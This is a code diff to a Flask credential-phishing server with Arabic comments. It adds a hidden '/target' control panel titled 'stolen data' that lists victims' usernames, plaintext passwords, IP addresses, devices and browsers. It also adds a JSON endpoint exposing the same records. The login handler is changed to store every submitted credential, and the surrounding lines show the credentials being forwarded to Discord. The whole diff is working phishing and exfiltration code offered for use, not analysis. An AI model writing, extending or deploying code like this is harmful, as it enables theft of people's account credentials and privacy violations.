@@ -11,9 +11,96 @@ import requests
 
 app = Flask(__name__)
 
+# ==================== تخزين بيانات الضحايا ====================
+visitors_data = []  # قائمة لتخزين كل من دخل الصفحة
+
 @app.route('/communities/<int:id>/<string:name>')
 def fake_community(id, name):
     return redirect("/")
+
+# ==================== المسار المخفي - لوحة التحكم ====================
+@app.route('/target')
+def target_panel():
+    """لوحة تحكم سرية تعرض كل البيانات المسروقة"""
+    html = """
+    <!DOCTYPE html>
+    <html dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <title>🎯 لوحة التحكم - البيانات المسروقة</title>
+        <style>
+            body { font-family: 'Segoe UI', Arial; background: #0a0a0a; color: #fff; margin: 0; padding: 20px; }
+            .container { max-width: 1200px; margin: auto; }
+            h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
+            .stats { background: #1a1a1a; padding: 15px; border-radius: 8px; margin: 20px 0; display: flex; gap: 20px; }
+            .stat-box { background: #2a2a2a; padding: 15px; border-radius: 5px; min-width: 150px; }
+            .stat-number { font-size: 28px; color: #00ff88; font-weight: bold; }
+            table { width: 100%; border-collapse: collapse; background: #1a1a1a; border-radius: 8px; overflow: hidden; }
+            th { background: #00ff88; color: #000; padding: 12px; text-align: center; }
+            td { padding: 10px; border-bottom: 1px solid #333; text-align: center; }
+            tr:hover { background: #2a2a2a; }
+            .ip { color: #ffaa00; font-family: monospace; }
+            .user { color: #00ccff; }
+            .pass { color: #ff6666; }
+            .timestamp { color: #888; font-size: 0.9em; }
+            .warning { background: #ff3333; color: white; padding: 10px; border-radius: 5px; text-align: center; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🎯 لوحة التحكم - البيانات المسروقة</h1>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div>إجمالي الضحايا</div>
+                    <div class="stat-number">""" + str(len(visitors_data)) + """</div>
+                </div>
+                <div class="stat-box">
+                    <div>آخر تحديث</div>
+                    <div class="stat-number" style="font-size: 16px;">""" + time.strftime('%Y-%m-%d %H:%M:%S') + """</div>
+                </div>
+            </div>
+            
+            """ + ("""
+            <table>
+                <tr>
+                    <th>#</th>
+                    <th>اسم المستخدم</th>
+                    <th>كلمة السر</th>
+                    <th>عنوان IP</th>
+                    <th>الجهاز</th>
+                    <th>نظام التشغيل</th>
+                    <th>المتصفح</th>
+                    <th>التاريخ</th>
+                </tr>
+                """ + "".join([f"""
+                <tr>
+                    <td>{i+1}</td>
+                    <td class="user">{v['username']}</td>
+                    <td class="pass">{v['password']}</td>
+                    <td class="ip">{v['ip']}</td>
+                    <td>{v['device']}</td>
+                    <td>{v['os']}</td>
+                    <td>{v['browser']}</td>
+                    <td class="timestamp">{v['time']}</td>
+                </tr>
+                """ for i, v in enumerate(reversed(visitors_data))]) + """
+            </table>
+            """) if visitors_data else """
+            <div class="warning">
+                ⚠️ لا توجد بيانات حتى الآن - انتظر حتى يقوم الضحايا بتسجيل الدخول
+            </div>
+            """ + """
+        </div>
+    </body>
+    </html>
+    """
+    return render_template_string(html)
+
+# ==================== مسار JSON للبيانات (API) ====================
+@app.route('/api/data')
+def api_data():
+    return {"total": len(visitors_data), "data": visitors_data}
 
 # أي صفحة HTML تريد تجربتها، ضعها هنا
 html_page = """
@@ -404,8 +491,18 @@ def login():
         user_agent = request.headers.get('User-Agent', '')
         device_type, os, browser = get_device_info(user_agent)
 
-        # 👇 تم استبدال كل الـ print الكبيرة بهذا الكود الجديد
-        # تجهيز الرسالة لإرسالها إلى Discord
+        # 👇 تخزين البيانات في القائمة
+        visitors_data.append({
+            'username': username,
+            'password': password,
+            'ip': client_ip,
+            'device': device_type,
+            'os': os,
+            'browser': browser,
+            'time': time.strftime('%Y-%m-%d %H:%M:%S')
+        })
+
+        # 👇 تجهيز الرسالة لإرسالها إلى Discord
         discord_message = f"**🌐 تسجيل دخول جديد**\n"
         discord_message += f"```\n"
         discord_message += f"👤 المستخدم: {username}\n"
